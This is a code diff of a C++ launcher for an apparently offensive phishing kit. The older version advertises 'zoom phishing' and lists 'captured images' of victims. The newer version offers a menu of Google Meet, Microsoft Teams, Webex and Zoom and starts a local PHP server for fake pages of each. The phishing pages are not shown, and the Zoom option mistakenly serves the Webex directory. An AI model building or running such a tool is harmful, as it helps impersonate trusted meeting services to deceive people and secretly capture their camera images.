@@ -1,72 +1,84 @@
 #include<iostream>
 #include<string.h>
 #include<stdlib.h>
-#include<cstdlib>
-#include<sstream>
-#include<csignal>
+#include<cstring>
 
 using namespace std;
 
-class Messages{
-	private:
-		int xd;
-	public:
-		int banner(){
-			system("cat ./banner.txt");
-			return 0;
-		}
-		int creator(){
-			cout<<"Creator: @DigitalNinja00 @Crow-ui Version : 1.0"<<endl;
-			return 0;
-		}
-};
-int function_lear(){
-	string lista[] = {"{1} START LISTEN", "{2} LIST PHOTOS","{0} EXIT"};
-	size_t hola = sizeof(lista)/sizeof(string);
-	for(int i=0;i<hola;i++){
-		cout<<lista[i]<<endl;
-	}
-	return 0;
-}
-int create_http_server(){
-	int puerto;
-	cout<<"Write the port for the http server>>> ";cin>>puerto;
-	if(puerto>65535 || puerto<1){
-		cout<<"Invalid port"<<endl;;
+class Decores{
+private:
+	int var;
+public:
+	int print_banner(){
+		system("cat banner.txt");
 		return 0;
 	}
-	stringstream var;
-	var<<"nohup php -S localhost:"<<puerto<<" -t ./web > /dev/null 2>&1 &";
-	system(var.str().c_str());
-	cout<<"Server with zoom phishing in port "<<puerto<<endl;
-	cout<<"photos saved in the \"web/server directory\""<<endl;;
-	cout<<"http://localhost:"<<puerto<<endl;
-	return 0;
+	int lista(){
+		string varca[] = {
+			"{1} GoogleMeet",
+			"{2} Microsoft Teams",
+			"{3} Webex",
+			"{4} Zoom",
+			"{0} Exit"
+		};
+		size_t local = sizeof(varca)/sizeof(string);
+		for(int x=0;x<local;x++){
+			cout<<varca[x]<<endl;
+		}
+		return 0;
+	}
+};
+
+void google_meet_web_server(){
+	system("nohup php -S localhost:8080 -t web/gmeet/ > /dev/null 2>&1 &");
 }
+void microsoft_teams_server(){
+	system("nohup php -S localhost:8080 -t web/mteams > /dev/null 2>&1 &");
+}
+void webex_server(){
+	system("nohup php -S localhost:8080 -t web/webex > /dev/null 2>&1 &");
+}
+void zoom_server(){
+	system("nohup php -S localhost:8080 -t web/webex > /dev/null 2>&1 &");
+}
+void default_(){
+	cout<<"Server \\/"<<endl;
+	cout<<"http://localhost:8080"<<endl;
+}
+
 int main(){
-	Messages ban;
-	Messages* nab = &ban;
-	nab->banner();
-	Messages cre;
-	Messages* erc = &cre;
-	erc->creator();
-	function_lear();
-	while(true){
-		int option;
-		cout<<"===> ";cin>>option;
-		if(option==1){
-			create_http_server();
+	Decores var; Decores* rar = &var;
+	rar->print_banner();
+	Decores ll; Decores* lol = &ll;
+	lol->lista();
+	int rio;
+	int control = 1;
+	while(control <= 10){
+		cout<<"OPTION> ";cin>>rio;
+		if(rio==0){
+			return 0;
 		}else{
-			if(option==2){
-				system("clear");
-				Messages mar;
-				Messages* ram = & mar;
-				ram->banner();
-				cout<<"[*] CAPTURED IMAGES web/server"<<endl;
-				system("ls -1 web/server");
-				system("sleep 5");
+			if(rio==1){
+				google_meet_web_server();
+				default_();
 			}else{
-				break;
+				if(rio==2){
+					microsoft_teams_server();
+					default_();
+				}else{
+					if(rio==3){
+						webex_server();
+						default_();
+					}else{
+						if(rio==4){
+							zoom_server();
+							default_();
+						}else{
+							cout<<"Error!";
+							return 0;
+						}
+					}
+				}
 			}
 		}
 	}
